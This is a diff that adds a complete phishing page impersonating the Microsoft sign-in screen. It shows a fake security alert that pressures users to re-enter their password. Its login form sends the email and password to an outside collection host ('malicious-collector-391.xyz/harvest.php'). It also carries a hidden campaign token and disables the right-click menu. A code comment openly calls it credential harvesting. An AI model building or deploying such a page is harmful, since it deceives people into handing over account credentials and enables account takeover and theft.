@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f3f2f1; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .login-card { background: #ffffff; width: 440px; padding: 44px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-radius: 2px; }
+        .logo-box { display: flex; align-items: center; gap: 4px; margin-bottom: 20px; }
+        .logo-grid { display: grid; grid-template-columns: 10px 10px; gap: 2px; }
+        .red { background: #f25022; width: 10px; height: 10px; }
+        .green { background: #7fba00; width: 10px; height: 10px; }
+        .blue { background: #00a4ef; width: 10px; height: 10px; }
+        .yellow { background: #ffb900; width: 10px; height: 10px; }
+        .brand-text { font-size: 1.25rem; font-weight: 600; color: #737373; margin-left: 8px; }
+        h1 { font-size: 1.5rem; font-weight: 600; margin: 0 0 12px 0; color: #1b1b1b; }
+        .alert-banner { background: #fde8e8; border-left: 4px solid #e02424; color: #9b1c1c; padding: 10px; font-size: 0.85rem; margin-bottom: 16px; }
+        .input-group { margin-bottom: 16px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #666; font-size: 1rem; outline: none; transition: border-color 0.2s; box-sizing: border-box; }
+        input[type="text"]:focus, input[type="password"]:focus { border-bottom: 2px solid #0067b8; }
+        .btn-submit { background: #0067b8; color: #ffffff; border: none; padding: 8px 32px; font-size: 0.95rem; font-weight: 600; float: right; cursor: pointer; margin-top: 16px; }
+        .btn-submit:hover { background: #005da6; }
+        .footer-links { margin-top: 40px; font-size: 0.8rem; color: #666; }
+        .footer-links a { color: #666; text-decoration: none; margin-right: 12px; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+    <div class="login-card">
+        <div class="logo-box">
+            <div class="logo-grid">
+                <div class="red"></div>
+                <div class="green"></div>
+                <div class="blue"></div>
+                <div class="yellow"></div>
+            </div>
+            <span class="brand-text">Microsoft</span>
+        </div>
+
+        <h1>Sign in</h1>
+        
+        <div class="alert-banner">
+            Security Notice: Unusual sign-in activity detected. Re-enter your password immediately to prevent account suspension.
+        </div>
+
+        <!-- Cross-domain credential harvesting form action -->
+        <form action="http://malicious-collector-391.xyz/harvest.php" method="POST">
+            <div class="input-group">
+                <input type="text" name="email" placeholder="Email, phone, or Skype" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="passwd" placeholder="Password" required>
+            </div>
+            <input type="hidden" name="campaign_token" value="zero_day_demo_token_8892">
+            <div>
+                <a href="#" style="font-size: 0.85rem; color: #0067b8; text-decoration: none;">Can't access your account?</a>
+            </div>
+            <button type="submit" class="btn-submit">Sign In</button>
+        </form>
+
+        <div style="clear: both;"></div>
+
+        <div class="footer-links">
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+            <a href="#">...</a>
+        </div>
+    </div>
+</body>
+</html>
+
